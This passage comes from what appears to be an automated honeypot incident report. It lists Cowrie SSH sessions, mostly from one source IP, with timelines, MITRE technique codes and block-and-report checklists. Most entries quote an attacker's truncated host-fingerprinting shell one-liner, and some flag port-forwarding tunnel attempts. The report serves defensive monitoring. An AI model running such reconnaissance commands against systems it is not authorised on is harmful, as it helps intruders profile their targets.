| `2026-07-10 12:08:38` | `cowrie.command.success` |
| `2026-07-10 12:08:38` | `cowrie.command.input` |
| `2026-07-10 12:08:38` | `cowrie.command.input` |
| `2026-07-10 12:08:38` | `cowrie.command.input` |
| `2026-07-10 12:08:38` | `cowrie.command.input` |
| `2026-07-10 12:08:38` | `cowrie.log.closed` |
| `2026-07-10 12:08:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1a91d26a0a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:09 |
| **Last Seen** | 2026-07-10 12:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:09:52` | `cowrie.session.connect` |
| `2026-07-10 12:09:52` | `cowrie.client.version` |
| `2026-07-10 12:09:52` | `cowrie.client.kex` |
| `2026-07-10 12:09:53` | `cowrie.login.success` |
| `2026-07-10 12:09:54` | `cowrie.session.params` |
| `2026-07-10 12:09:54` | `cowrie.command.input` |
| `2026-07-10 12:09:54` | `cowrie.command.input` |
| `2026-07-10 12:09:54` | `cowrie.command.input` |
| `2026-07-10 12:09:54` | `cowrie.command.input` |
| `2026-07-10 12:09:54` | `cowrie.command.input` |
| `2026-07-10 12:09:54` | `cowrie.command.success` |
| `2026-07-10 12:09:54` | `cowrie.command.input` |
| `2026-07-10 12:09:54` | `cowrie.command.input` |
| `2026-07-10 12:09:54` | `cowrie.command.input` |
| `2026-07-10 12:09:54` | `cowrie.command.input` |
| `2026-07-10 12:09:55` | `cowrie.log.closed` |
| `2026-07-10 12:09:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ed107ea91e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:11 |
| **Last Seen** | 2026-07-10 12:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:11:09` | `cowrie.session.connect` |
| `2026-07-10 12:11:09` | `cowrie.client.version` |
| `2026-07-10 12:11:09` | `cowrie.client.kex` |
| `2026-07-10 12:11:10` | `cowrie.login.success` |
| `2026-07-10 12:11:11` | `cowrie.session.params` |
| `2026-07-10 12:11:11` | `cowrie.command.input` |
| `2026-07-10 12:11:11` | `cowrie.command.input` |
| `2026-07-10 12:11:11` | `cowrie.command.input` |
| `2026-07-10 12:11:11` | `cowrie.command.input` |
| `2026-07-10 12:11:11` | `cowrie.command.input` |
| `2026-07-10 12:11:11` | `cowrie.command.success` |
| `2026-07-10 12:11:11` | `cowrie.command.input` |
| `2026-07-10 12:11:11` | `cowrie.command.input` |
| `2026-07-10 12:11:11` | `cowrie.command.input` |
| `2026-07-10 12:11:11` | `cowrie.command.input` |
| `2026-07-10 12:11:12` | `cowrie.log.closed` |
| `2026-07-10 12:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5292b0f9a2d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:12 |
| **Last Seen** | 2026-07-10 12:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:12:25` | `cowrie.session.connect` |
| `2026-07-10 12:12:25` | `cowrie.client.version` |
| `2026-07-10 12:12:25` | `cowrie.client.kex` |
| `2026-07-10 12:12:26` | `cowrie.login.success` |
| `2026-07-10 12:12:27` | `cowrie.session.params` |
| `2026-07-10 12:12:27` | `cowrie.command.input` |
| `2026-07-10 12:12:27` | `cowrie.command.input` |
| `2026-07-10 12:12:27` | `cowrie.command.input` |
| `2026-07-10 12:12:27` | `cowrie.command.input` |
| `2026-07-10 12:12:27` | `cowrie.command.input` |
| `2026-07-10 12:12:27` | `cowrie.command.success` |
| `2026-07-10 12:12:27` | `cowrie.command.input` |
| `2026-07-10 12:12:27` | `cowrie.command.input` |
| `2026-07-10 12:12:27` | `cowrie.command.input` |
| `2026-07-10 12:12:27` | `cowrie.command.input` |
| `2026-07-10 12:12:27` | `cowrie.log.closed` |
| `2026-07-10 12:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ab60ea175ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:13 |
| **Last Seen** | 2026-07-10 12:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:13:41` | `cowrie.session.connect` |
| `2026-07-10 12:13:42` | `cowrie.client.version` |
| `2026-07-10 12:13:42` | `cowrie.client.kex` |
| `2026-07-10 12:13:43` | `cowrie.login.success` |
| `2026-07-10 12:13:44` | `cowrie.session.params` |
| `2026-07-10 12:13:44` | `cowrie.command.input` |
| `2026-07-10 12:13:44` | `cowrie.command.input` |
| `2026-07-10 12:13:44` | `cowrie.command.input` |
| `2026-07-10 12:13:44` | `cowrie.command.input` |
| `2026-07-10 12:13:44` | `cowrie.command.input` |
| `2026-07-10 12:13:44` | `cowrie.command.success` |
| `2026-07-10 12:13:44` | `cowrie.command.input` |
| `2026-07-10 12:13:44` | `cowrie.command.input` |
| `2026-07-10 12:13:44` | `cowrie.command.input` |
| `2026-07-10 12:13:44` | `cowrie.command.input` |
| `2026-07-10 12:13:44` | `cowrie.log.closed` |
| `2026-07-10 12:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf6cb56c271

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:14 |
| **Last Seen** | 2026-07-10 12:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:14:58` | `cowrie.session.connect` |
| `2026-07-10 12:14:58` | `cowrie.client.version` |
| `2026-07-10 12:14:58` | `cowrie.client.kex` |
| `2026-07-10 12:14:59` | `cowrie.login.success` |
| `2026-07-10 12:15:00` | `cowrie.session.params` |
| `2026-07-10 12:15:00` | `cowrie.command.input` |
| `2026-07-10 12:15:00` | `cowrie.command.input` |
| `2026-07-10 12:15:00` | `cowrie.command.input` |
| `2026-07-10 12:15:00` | `cowrie.command.input` |
| `2026-07-10 12:15:00` | `cowrie.command.input` |
| `2026-07-10 12:15:00` | `cowrie.command.success` |
| `2026-07-10 12:15:00` | `cowrie.command.input` |
| `2026-07-10 12:15:00` | `cowrie.command.input` |
| `2026-07-10 12:15:00` | `cowrie.command.input` |
| `2026-07-10 12:15:00` | `cowrie.command.input` |
| `2026-07-10 12:15:01` | `cowrie.log.closed` |
| `2026-07-10 12:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75977344a584

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 12:14 |
| **Last Seen** | 2026-07-10 12:15 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:14:58` | `cowrie.session.connect` |
| `2026-07-10 12:15:00` | `cowrie.client.version` |
| `2026-07-10 12:15:00` | `cowrie.client.kex` |
| `2026-07-10 12:15:05` | `cowrie.login.success` |
| `2026-07-10 12:15:09` | `cowrie.session.params` |
| `2026-07-10 12:15:09` | `cowrie.command.input` |
| `2026-07-10 12:15:11` | `cowrie.log.closed` |
| `2026-07-10 12:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1905015f32bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:16 |
| **Last Seen** | 2026-07-10 12:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:16:17` | `cowrie.session.connect` |
| `2026-07-10 12:16:17` | `cowrie.client.version` |
| `2026-07-10 12:16:17` | `cowrie.client.kex` |
| `2026-07-10 12:16:18` | `cowrie.login.success` |
| `2026-07-10 12:16:19` | `cowrie.session.params` |
| `2026-07-10 12:16:19` | `cowrie.command.input` |
| `2026-07-10 12:16:19` | `cowrie.command.input` |
| `2026-07-10 12:16:19` | `cowrie.command.input` |
| `2026-07-10 12:16:19` | `cowrie.command.input` |
| `2026-07-10 12:16:19` | `cowrie.command.input` |
| `2026-07-10 12:16:19` | `cowrie.command.success` |
| `2026-07-10 12:16:19` | `cowrie.command.input` |
| `2026-07-10 12:16:19` | `cowrie.command.input` |
| `2026-07-10 12:16:19` | `cowrie.command.input` |
| `2026-07-10 12:16:19` | `cowrie.command.input` |
| `2026-07-10 12:16:19` | `cowrie.log.closed` |
| `2026-07-10 12:16:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b31bd30b15d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:17 |
| **Last Seen** | 2026-07-10 12:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:17:36` | `cowrie.session.connect` |
| `2026-07-10 12:17:36` | `cowrie.client.version` |
| `2026-07-10 12:17:36` | `cowrie.client.kex` |
| `2026-07-10 12:17:37` | `cowrie.login.success` |
| `2026-07-10 12:17:38` | `cowrie.session.params` |
| `2026-07-10 12:17:38` | `cowrie.command.input` |
| `2026-07-10 12:17:38` | `cowrie.command.input` |
| `2026-07-10 12:17:38` | `cowrie.command.input` |
| `2026-07-10 12:17:38` | `cowrie.command.input` |
| `2026-07-10 12:17:38` | `cowrie.command.input` |
| `2026-07-10 12:17:38` | `cowrie.command.success` |
| `2026-07-10 12:17:38` | `cowrie.command.input` |
| `2026-07-10 12:17:38` | `cowrie.command.input` |
| `2026-07-10 12:17:38` | `cowrie.command.input` |
| `2026-07-10 12:17:38` | `cowrie.command.input` |
| `2026-07-10 12:17:39` | `cowrie.log.closed` |
| `2026-07-10 12:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ec7adc1e1c4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:19 |
| **Last Seen** | 2026-07-10 12:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:19:02` | `cowrie.session.connect` |
| `2026-07-10 12:19:02` | `cowrie.client.version` |
| `2026-07-10 12:19:02` | `cowrie.client.kex` |
| `2026-07-10 12:19:02` | `cowrie.login.success` |
| `2026-07-10 12:19:03` | `cowrie.session.params` |
| `2026-07-10 12:19:03` | `cowrie.command.input` |
| `2026-07-10 12:19:03` | `cowrie.command.input` |
| `2026-07-10 12:19:03` | `cowrie.command.input` |
| `2026-07-10 12:19:03` | `cowrie.command.input` |
| `2026-07-10 12:19:03` | `cowrie.command.input` |
| `2026-07-10 12:19:03` | `cowrie.command.success` |
| `2026-07-10 12:19:03` | `cowrie.command.input` |
| `2026-07-10 12:19:03` | `cowrie.command.input` |
| `2026-07-10 12:19:03` | `cowrie.command.input` |
| `2026-07-10 12:19:03` | `cowrie.command.input` |
| `2026-07-10 12:19:04` | `cowrie.log.closed` |
| `2026-07-10 12:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09c6294c6a71

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-10 12:19 |
| **Last Seen** | 2026-07-10 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:19:19` | `cowrie.session.connect` |
| `2026-07-10 12:19:19` | `cowrie.client.version` |
| `2026-07-10 12:19:19` | `cowrie.client.kex` |
| `2026-07-10 12:19:20` | `cowrie.login.success` |
| `2026-07-10 12:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ba9598bd456

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-10 12:19 |
| **Last Seen** | 2026-07-10 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:19:19` | `cowrie.session.connect` |
| `2026-07-10 12:19:19` | `cowrie.client.version` |
| `2026-07-10 12:19:19` | `cowrie.client.kex` |
| `2026-07-10 12:19:20` | `cowrie.login.success` |
| `2026-07-10 12:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67a277685342

| Field | Detail |
|---|---|
| **Source IP** | `27.128.162[.]146` |
| **First Seen** | 2026-07-10 12:19 |
| **Last Seen** | 2026-07-10 12:20 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:19:54` | `cowrie.session.connect` |
| `2026-07-10 12:19:54` | `cowrie.client.version` |
| `2026-07-10 12:19:54` | `cowrie.client.kex` |
| `2026-07-10 12:19:58` | `cowrie.login.success` |
| `2026-07-10 12:19:59` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.162[.]146` to AbuseIPDB if not already reported
- [ ] Block `27.128.162[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a98d4c11f4fa

| Field | Detail |
|---|---|
| **Source IP** | `45.181.101[.]95` |
| **First Seen** | 2026-07-10 12:20 |
| **Last Seen** | 2026-07-10 12:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:20:09` | `cowrie.session.connect` |
| `2026-07-10 12:20:09` | `cowrie.client.version` |
| `2026-07-10 12:20:09` | `cowrie.client.kex` |
| `2026-07-10 12:20:11` | `cowrie.login.success` |
| `2026-07-10 12:20:12` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.181.101[.]95` to AbuseIPDB if not already reported
- [ ] Block `45.181.101[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b2488f045ab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:20 |
| **Last Seen** | 2026-07-10 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:20:26` | `cowrie.session.connect` |
| `2026-07-10 12:20:26` | `cowrie.client.version` |
| `2026-07-10 12:20:26` | `cowrie.client.kex` |
| `2026-07-10 12:20:26` | `cowrie.login.success` |
| `2026-07-10 12:20:27` | `cowrie.session.params` |
| `2026-07-10 12:20:27` | `cowrie.command.input` |
| `2026-07-10 12:20:27` | `cowrie.command.input` |
| `2026-07-10 12:20:27` | `cowrie.command.input` |
| `2026-07-10 12:20:27` | `cowrie.command.input` |
| `2026-07-10 12:20:27` | `cowrie.command.input` |
| `2026-07-10 12:20:27` | `cowrie.command.success` |
| `2026-07-10 12:20:27` | `cowrie.command.input` |
| `2026-07-10 12:20:27` | `cowrie.command.input` |
| `2026-07-10 12:20:27` | `cowrie.command.input` |
| `2026-07-10 12:20:27` | `cowrie.command.input` |
| `2026-07-10 12:20:27` | `cowrie.log.closed` |
| `2026-07-10 12:20:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0ad41932d9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:21 |
| **Last Seen** | 2026-07-10 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:21:51` | `cowrie.session.connect` |
| `2026-07-10 12:21:51` | `cowrie.client.version` |
| `2026-07-10 12:21:51` | `cowrie.client.kex` |
| `2026-07-10 12:21:52` | `cowrie.login.success` |
| `2026-07-10 12:21:52` | `cowrie.session.params` |
| `2026-07-10 12:21:52` | `cowrie.command.input` |
| `2026-07-10 12:21:52` | `cowrie.command.input` |
| `2026-07-10 12:21:52` | `cowrie.command.input` |
